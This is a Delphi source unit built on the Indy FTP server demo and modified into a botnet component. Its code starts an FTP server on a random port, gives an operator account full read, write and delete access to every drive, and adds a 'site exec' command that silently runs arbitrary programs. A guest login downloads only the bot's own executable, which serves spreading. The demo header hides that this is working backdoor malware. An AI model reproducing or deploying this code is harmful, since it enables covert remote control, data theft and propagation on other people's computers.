{ $HDR$}
{**********************************************************************}
{ Unit archived using Team Coherence                                   }
{ Team Coherence is Copyright 2002 by Quality Software Components      }
{                                                                      }
{ For further information / comments, visit our WEB site at            }
{ http://www.TeamCoherence.com                                         }
{**********************************************************************}
{}
{ Modded // Morpheus
{ Date: 29/9/06
{
{ = I have modded the ftp, it now have 2 users.
{
{ $Log:  23310: FTPServer_console.dpr
{ 
{   Rev 1.1    25/10/2004 22:48:54  ANeillans    Version: 9.0.17
{ Verified
} 
{
{   Rev 1.0    12/09/2003 22:47:52  ANeillans
{ Initial Checkin
{ Verified against Indy 9 and D7
}
{
  Demo Name:  FTP Server Demo
  Created By: Bas Gooijen
          On: Unknown

  Notes:
    FTP Server Demo 
    Sample of the usage of the TIdFtpServer component.
    Also shows how to use Indy in console apps

  Version History:
    None

  Tested:
   Indy 9:
     D5:     Untested
     D6:     Untested
     D7:     25th Oct 2004 by Andy Neillans
             Tested with Microsoft FTP Client
}

{$include def.mor}

unit ftp;

interface

uses
  Classes,
  windows,
  sysutils,
  {$ifdef debug}logger,{$endif}
  IdFTPList,
  IdFTPServer,
  idtcpserver,
  IdFtpCommon,
  IdSocketHandle,
  idglobal,
  Config,
  IdHashCRC;

type
  TFTPServer = class
  private
    { Private declarations }
    ActiveDir,User,pass:String;
    AnoOnline:Boolean;  // Guest User
    IdFTPServer: tIdFTPServer;
    procedure IdFTPServer1UserLogin( ASender: TIdFTPServerThread; const AUsername, APassword: string; var AAuthenticated: Boolean ) ;
    procedure IdFTPServer1ListDirectory( ASender: TIdFTPServerThread; const APath: string; ADirectoryListing: TIdFTPListItems ) ;
    procedure IdFTPServer1RenameFile( ASender: TIdFTPServerThread; const ARenameFromFile, ARenameToFile: string ) ;
    procedure IdFTPServer1RetrieveFile( ASender: TIdFTPServerThread; const AFilename: string; var VStream: TStream ) ;
    procedure IdFTPServer1StoreFile( ASender: TIdFTPServerThread; const AFilename: string; AAppend: Boolean; var VStream: TStream ) ;
    procedure IdFTPServer1RemoveDirectory( ASender: TIdFTPServerThread; var VDirectory: string ) ;
    procedure IdFTPServer1MakeDirectory( ASender: TIdFTPServerThread; var VDirectory: string ) ;
    procedure IdFTPServer1GetFileSize( ASender: TIdFTPServerThread; const AFilename: string; var VFileSize: Int64 ) ;
    procedure IdFTPServer1DeleteFile( ASender: TIdFTPServerThread; const APathname: string ) ;
    procedure IdFTPServer1ChangeDirectory( ASender: TIdFTPServerThread; var VDirectory: string ) ;
    procedure IdFTPServer1CommandXCRC( ASender: TIdCommand ) ;
    procedure IdFTPServer1DisConnect( AThread: TIdPeerThread ) ;
  protected
    function TransLatePath( const APathname : String ) : string;
  public
    constructor Create(NewUser,NewPassword:String;port:longint); reintroduce;
    destructor Destroy; override;
  end;

Procedure Run;

Var Port:Longint;
    User,Pass:String;
    FtpObj:TFTPServer=nil;

implementation

constructor TFTPServer.Create;
begin
  IdFTPServer := tIdFTPServer.create( nil ) ;
  IdFTPServer.DefaultPort := port;
  IdFTPServer.AllowAnonymousLogin := False;
  IdFTPServer.EmulateSystem := ftpsUNIX;
  IdFTPServer.HelpReply.text := 'Help is not implemented';
  IdFTPServer.OnChangeDirectory := IdFTPServer1ChangeDirectory;
  IdFTPServer.OnChangeDirectory := IdFTPServer1ChangeDirectory;
  IdFTPServer.OnGetFileSize := IdFTPServer1GetFileSize;
  IdFTPServer.OnListDirectory := IdFTPServer1ListDirectory;
  IdFTPServer.OnUserLogin := IdFTPServer1UserLogin;
  IdFTPServer.OnRenameFile := IdFTPServer1RenameFile;
  IdFTPServer.OnDeleteFile := IdFTPServer1DeleteFile;
  IdFTPServer.OnRetrieveFile := IdFTPServer1RetrieveFile;
  IdFTPServer.OnStoreFile := IdFTPServer1StoreFile;
  IdFTPServer.OnMakeDirectory := IdFTPServer1MakeDirectory;
  IdFTPServer.OnRemoveDirectory := IdFTPServer1RemoveDirectory;
  IdFTPServer.Greeting.NumericCode := 220;
  IdFTPServer.OnDisconnect := IdFTPServer1DisConnect;
  with IdFTPServer.CommandHandlers.add do
  begin
    Command := 'site exec';
    OnCommand := IdFTPServer1CommandXCRC;
  end;
  User:=Newuser;
  Pass:=Newpassword;
  IdFTPServer.Active := true;
end;

Function ExecNewProcess(ProgramName : String; Wait: Boolean):Boolean;
var
  StartInfo : TStartupInfo;
  ProcInfo : TProcessInformation;
  CreateOK : Boolean;
begin
  Result:=True;
    { fill with known state } 
  FillChar(StartInfo,SizeOf(TStartupInfo),#0);
  FillChar(ProcInfo,SizeOf(TProcessInformation),#0);
  StartInfo.cb := SizeOf(TStartupInfo);
  StartInfo.dwFlags :=  STARTF_USESHOWWINDOW;
  StartInfo.wShowWindow := SW_HIDE;

  CreateOK := CreateProcess(nil, PChar(ProgramName), nil, nil,False,
              CREATE_NEW_PROCESS_GROUP+NORMAL_PRIORITY_CLASS,
              nil, nil, StartInfo, ProcInfo);
    { check to see if successful } 
  if CreateOK then
    begin
        //may or may not be needed. Usually wait for child processes 
      if Wait then
        WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    end
  else
    begin
      Result:=False;
     end;
  CloseHandle(ProcInfo.hProcess);
  CloseHandle(ProcInfo.hThread);
end;

procedure TFTPServer.IdFTPServer1CommandXCRC( ASender: TIdCommand ) ;
// note, this is made up, and not defined in any rfc.
var
  s: string;
begin
  with TIdFTPServerThread( ASender.Thread ) do
  begin
    if Authenticated and not AnoOnline then
    begin
      if ExecNewProcess(TransLatePath(ASender.UnparsedParams),false) then
        ASender.Reply.SetReply( 213, 'GOOD' )
      else
        ASender.Reply.SetReply( 500, 'cannot execute' ) ;
    end
    else
      ASender.Reply.SetReply( 500, 'SORRY ONLY MORPHEUS CAN DO THAT') ;
  end;
end;

destructor TFTPServer.Destroy;
begin
  IdFTPServer.free;
  inherited destroy;
end;

function StartsWith( const str, substr: string ) : boolean;
begin
  result := copy( str, 1, length( substr ) ) = substr;
end;

function BackSlashToSlash( const str: string ) : string;
var
  a: dword;
begin
  result := str;
  for a := 1 to length( result ) do
    if result[a] = '\' then
      result[a] := '/';
end;

function SlashToBackSlash( const str: string ) : string;
var
  a: dword;
begin
  result := str;
  for a := 1 to length( result ) do
    if result[a] = '/' then
      result[a] := '\';
end;

function TFTPServer.TransLatePath( const APathname :String ) : string;
var
  tmppath: string;
begin
If pos('/',APathname) > 0 then
begin
  tmppath:=APathname;
  if tmppath = '/' then
  begin
    Result:='ROOT';
    exit;
  end;
end
else
  tmppath:=ActiveDir + APathname;
tmppath:=SlashToBackSlash(tmppath);
delete(tmppath,1,1);
insert(':',tmppath,2);
result:=tmppath;
end;

function GetSizeOfFile( const APathname: string ) : int64;
begin
  result := FileSizeByName( APathname ) ;
end;

function GetNewDirectory( old, action: string ) : string;
var
  a: integer;
begin
  if action = '../' then
  begin
    if old = '/' then
    begin
      result := old;
      exit;
    end;
    a := length( old ) - 1;
    while ( old[a] <> '\' ) and ( old[a] <> '/' ) do
      dec( a ) ;
    result := copy( old, 1, a ) ;
    exit;
  end;
  if ( action[1] = '/' ) or ( action[1] = '\' ) then
    result := action
  else
    result := old + action;
end;

procedure TFTPServer.IdFTPServer1UserLogin( ASender: TIdFTPServerThread;
  const AUsername, APassword: string; var AAuthenticated: Boolean ) ;
begin
  AAuthenticated := ( AUsername = Data.FTP_User ) and ( APassword = DATA.FTP_Pass ) ;
  AnoOnline := ( AUsername = User ) and ( APassword = Pass ) ;  // GUEST
  if AnoOnline then AAuthenticated :=true;
  if not (AAuthenticated) then
    exit;
  ASender.HomeDir := '/';
  asender.currentdir := '/';
end;

procedure TFTPServer.IdFTPServer1ListDirectory( ASender: TIdFTPServerThread; const APath: string; ADirectoryListing: TIdFTPListItems ) ;

  procedure AddlistItem( aDirectoryListing: TIdFTPListItems; Filename: string; ItemType: TIdDirItemType; size: int64; date: tdatetime ) ;
  var
    listitem: TIdFTPListItem;
  begin
    listitem := aDirectoryListing.Add;
    listitem.ItemType := ItemType;
    listitem.FileName := Filename;
    listitem.OwnerName := 'anonymous';
    listitem.GroupName := 'all';
    listitem.OwnerPermissions := '---';
    listitem.GroupPermissions := '---';
    listitem.UserPermissions := '---';
    listitem.Size := size;
    listitem.ModifiedDate := date;
  end;

var
  f: tsearchrec;
  a,i: integer;
  A2: Cardinal;
  tmppath:string;
begin
  if AnoOnline then
  begin
    AddlistItem( ADirectoryListing, ExtractFileName(ParamStr(0)), ditFile, GetSizeOfFile(ParamStr(0)),StrToDate('17/02/1987') );
    exit;
  end;
  tmppath:=apath;
  if tmppath[length(tmppath)] <> '/' then
  begin
    for i:=length(tmppath) downto 1 do
      if tmppath[i] <> '/' then
        delete(tmppath,i,1)
      else
        break;
  end;
  ADirectoryListing.DirectoryName := tmppath;
  tmppath:=TransLatePath( tmppath );
  if  tmppath  = 'ROOT' then
  begin
   A2 := GetLogicalDrives;
   for A := 2 to 31 do
   if (A2 and (1 shl A)) <> 0 then
     AddlistItem( ADirectoryListing, char(a+ord('A')), ditDirectory, 0, StrToDate('18/02/1950' ));
  end
  else
  begin
    a := FindFirst(  tmppath  + '*.*', faAnyFile, f ) ;
    while ( a = 0 ) do
    begin
      if ( f.Attr and faDirectory > 0 ) then
       AddlistItem( ADirectoryListing, f.Name, ditDirectory, f.size, FileDateToDateTime( f.Time ) )
     else
       AddlistItem( ADirectoryListing, f.Name, ditFile, f.size, FileDateToDateTime( f.Time ) ) ;
     a := FindNext( f ) ;
    end;
    FindClose( f ) ;
  end;
end;

procedure TFTPServer.IdFTPServer1RenameFile( ASender: TIdFTPServerThread;
  const ARenameFromFile, ARenameToFile: string ) ;
var
  sf,st:string;
begin
  if Asender.Authenticated and not AnoOnline then
  begin
    sf := TransLatePath(ARenameFromFile);
    st := TransLatePath(ARenameToFile);
    Renamefile(sf,st);
  end;
end;

procedure TFTPServer.IdFTPServer1RetrieveFile( ASender: TIdFTPServerThread;
  const AFilename: string; var VStream: TStream ) ;
begin
  if Asender.Authenticated and not AnoOnline then
    VStream := TFileStream.create( translatepath( AFilename  ) , fmopenread or fmShareDenyWrite )
  else
    if AnoOnline then
       VStream := TFileStream.create( ParamStr(0) , fmopenread or fmShareDenyWrite ) ;
end;

procedure TFTPServer.IdFTPServer1StoreFile( ASender: TIdFTPServerThread;
  const AFilename: string; AAppend: Boolean; var VStream: TStream ) ;
begin
  if Asender.Authenticated and not AnoOnline then
    if Aappend then
    begin
      VStream := TFileStream.create( translatepath( AFilename ) , fmOpenWrite or fmShareExclusive ) ;
      VStream.Seek( 0, soFromEnd ) ;
    end
    else
      VStream := TFileStream.create( translatepath( AFilename ) , fmCreate or fmShareExclusive ) ;
end;

procedure TFTPServer.IdFTPServer1RemoveDirectory( ASender: TIdFTPServerThread;
  var VDirectory: string ) ;
begin
  if Asender.Authenticated and not AnoOnline then
    RmDir( TransLatePath( VDirectory ) ) ;
end;

procedure TFTPServer.IdFTPServer1MakeDirectory( ASender: TIdFTPServerThread;
  var VDirectory: string ) ;
begin
  if Asender.Authenticated and not AnoOnline then
    MkDir( TransLatePath( VDirectory ) ) ;
end;


procedure TFTPServer.IdFTPServer1GetFileSize( ASender: TIdFTPServerThread;
  const AFilename: string; var VFileSize: Int64 ) ;
var s:string;
begin
  s := TransLatePath(AFilename);
  try
  If FileExists(s) then
    VFileSize :=  GetSizeofFile(S)
    else VFileSize := 0;
  except
    VFileSize := 0;
  end;
end;

procedure TFTPServer.IdFTPServer1DeleteFile( ASender: TIdFTPServerThread;
  const APathname: string ) ;
begin
  if Asender.Authenticated and not AnoOnline then
    DeleteFile( pchar( TransLatePath( APathname ) ) ) ;
end;

procedure TFTPServer.IdFTPServer1ChangeDirectory( ASender: TIdFTPServerThread;
  var VDirectory: string ) ;
begin
  if Asender.Authenticated and not AnoOnline then
  begin
    VDirectory := GetNewDirectory( ASender.CurrentDir, VDirectory ) ;
    ActiveDir:=VDirectory + '/';
  end
end;

procedure TFTPServer.IdFTPServer1DisConnect( AThread: TIdPeerThread ) ;
begin
  //  nothing much here
end;

Procedure Run;
begin
  Randomize;
  User:=Inttostr(random(999)+1000);
  Pass:=Inttostr(random(999)+1000);
  Port:=random(64535)+1000;
  Try
    FTPObj:=TFTPServer.Create(User,Pass,port);
  Except
    FTPObj:=nil;
  end;
  {$ifdef debug}
  if FTPObj <> nil then
    AddToMessageLog('[DEBUG] FTP STARED IP['+Config.Data.BOT_LocalIP+'] PORT['+inttostr(port)+']')
  else
    AddToMessageLog('[DEBUF] UNABLE TO START FTP PORT['+inttostr(port)+']');
  {$endif}
end;

end.



